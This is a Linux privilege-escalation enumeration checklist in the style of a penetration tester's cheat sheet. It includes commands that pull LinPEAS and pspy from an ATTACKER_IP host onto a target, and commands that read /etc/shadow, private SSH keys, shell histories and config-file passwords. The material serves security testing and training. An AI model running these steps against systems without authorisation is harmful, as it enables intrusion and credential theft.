## Initial Setup - Transfer Tools

```bash
# On attacker machine - Start HTTP server
python3 -m http.server 8000

# On target machine - Download linpeas.sh
wget http://ATTACKER_IP:8000/linpeas.sh
curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh

# Download pspy64
wget http://ATTACKER_IP:8000/pspy64
curl http://ATTACKER_IP:8000/pspy64 -o pspy64

# Make executable
chmod +x linpeas.sh pspy64
```

## Automated Enumeration

- [ ] **Run LinPEAS**

```bash
./linpeas.sh | tee linpeas_output.txt
```

- [ ] **Run pspy64 (monitor processes)**

```bash
./pspy64
```

## Manual Enumeration Checklist

### System Information

- [ ] **OS Version & Kernel**

```bash
uname -a
cat /etc/os-release
cat /etc/issue
lsb_release -a
```

- [ ] **Current User & Groups**

```bash
id
whoami
groups
```

- [ ] **Sudo Privileges**

```bash
sudo -l
```

- [ ] **Environment Variables**

```bash
env
cat /etc/environment
```

### User Enumeration

- [ ] **List All Users**

```bash
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1
```

- [ ] **User Home Directories**

```bash
ls -la /home/
```

- [ ] **Password Hashes**

```bash
cat /etc/shadow  # If readable
```

- [ ] **Command History**

```bash
cat ~/.bash_history
cat ~/.zsh_history
history
find / -name ".bash_history" 2>/dev/null
```

### File System Checks

- [ ] **SUID/SGID Files**

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

- [ ] **World-Writable Files**

```bash
find / -writable -type f 2>/dev/null | grep -v "/proc/"
find / -perm -222 -type f 2>/dev/null
find / -perm -o w -type f 2>/dev/null
```

- [ ] **World-Writable Directories**

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

- [ ] **Config Files with Passwords**

```bash
grep -ri "password" /etc/ 2>/dev/null
grep -ri "pass=" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -i "pass\|pwd" {} \; 2>/dev/null
```

- [ ] **SSH Keys**

```bash
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
```

- [ ] **Interesting Files in /tmp, /var/tmp, /dev/shm**

```bash
ls -la /tmp /var/tmp /dev/shm
```

### Scheduled Tasks & Cron Jobs

- [ ] **Cron Jobs**

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*
```

- [ ] **Systemd Timers**

```bash
systemctl list-timers --all
```

### Running Processes & Services

- [ ] **Running Processes**

```bash
ps aux
ps -ef
top
```

- [ ] **Services**

```bash
systemctl list-units --type=service
service --status-all
```

- [ ] **Network Connections**

```bash
netstat -antup
ss -tulpn
```

### Exploitable Software

- [ ] **Installed Packages**

```bash
dpkg -l  # Debian/Ubuntu
rpm -qa  # RedHat/CentOS
```

- [ ] **Check for Outdated/Vulnerable Software**

```bash
which gcc g++ python python3 perl ruby
```

### Kernel Exploits

- [ ] **Check Kernel Version**

```bash
uname -r
searchsploit "linux kernel $(uname -r)"
```

### Capabilities

- [ ] **Check File Capabilities**

```bash
getcap -r / 2>/dev/null
```

### Docker/Container Checks

- [ ] **Check if Inside Container**

```bash
cat /proc/1/cgroup
ls -la /.dockerenv
```

- [ ] **Docker Socket Access**

```bash
ls -la /var/run/docker.sock
```

### NFS Shares

- [ ] **Check NFS Exports**

```bash
cat /etc/exports
showmount -e localhost
```

### Path Hijacking

- [ ] **Check PATH Variable**

```bash
echo $PATH
```

- [ ] **Writable Directories in PATH**

```bash
echo $PATH | tr ":" "\n" | while read dir; do ls -ld "$dir" 2>/dev/null; done
```

## Quick One-Liners

```bash
# Quick SUID check
find / -perm -4000 2>/dev/null

# Quick writable check  
find / -writable -type d 2>/dev/null | grep -v proc

# Quick capability check
getcap -r / 2>/dev/null

# Find writable scripts in PATH
for dir in $(echo $PATH | tr ":" "\n"); do find $dir -writable -type f 2>/dev/null; done
```